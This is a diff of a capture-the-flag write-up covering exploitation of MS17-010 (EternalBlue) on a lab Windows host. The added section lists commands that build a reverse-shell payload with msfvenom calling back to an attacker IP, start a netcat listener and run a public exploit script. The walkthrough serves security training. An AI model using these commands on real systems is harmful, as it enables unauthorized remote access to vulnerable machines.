@@ -33,7 +33,7 @@ nmap --script vuln 10.10.10.40
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be27653c-bed5-41e6-bf76-9b531c32a044)
 
 
-## Exploitation & Gaining Access
+## Exploitation & Gaining Access & Privilege Escalation
 ```
 searchsploit ms17-010
 
@@ -44,13 +44,33 @@ mv 42315.py ms17-010.py
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0ff3583a-8c7e-46f7-a6b0-27fbd1a5692b)
 
+Modify username as **guest** in the below exploit:
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/74f3513b-14eb-452e-98ba-2dd5bd2117da)
 
+Uncomment and modify:
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7eb03635-3cf3-4bef-b318-aa69bb2263f0)
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/521a14ec-bd35-4563-af1e-a7e350f62e53)
 
-## Privilege Escalation
+```
+On kali attack machine:
+wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
 
+msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.24 LPORT=4444 -o ms17-010.exe
+
+nc -lnvp 4444
+
+python2 ms17-010.py 10.10.10.40
+
+# On the target machine:
+whoami
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1dadd00f-e06d-4a7b-8a2d-b6a4c02286d0)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b30f7bd-8ec0-4e8b-902b-78ed57b5660b)
 
 
 
